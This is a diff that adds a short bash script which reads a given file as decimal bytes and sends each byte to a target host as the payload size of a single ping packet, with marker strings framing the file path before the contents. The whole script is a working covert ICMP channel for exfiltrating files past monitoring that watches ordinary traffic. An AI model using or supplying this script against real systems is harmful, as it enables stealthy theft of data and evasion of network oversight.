@@ -1,0 +1,23 @@
+#!/bin/bash
+if [[ ! -f "$1" || "$#" < 2 ]]; then
+    echo "usage: `basename $0` <file_path> <target>"
+    exit 1
+fi
+filePath="$1"
+target="$2"
+fileCode=`od -An -tu1 -v "$filePath"`
+function sendChar() {
+    ping "$target" -c1 -s "$1" &> /dev/null
+}
+function sendData() {
+    strCode=`echo -n "$1" | od -An -tu1 -v`
+    for char in ${strCode}; do
+        sendChar "$char"
+    done
+}
+sendData ":42:"
+sendData "File: $filePath"
+sendData ":43:"
+for item in ${fileCode}; do
+    sendChar "$item"
+done
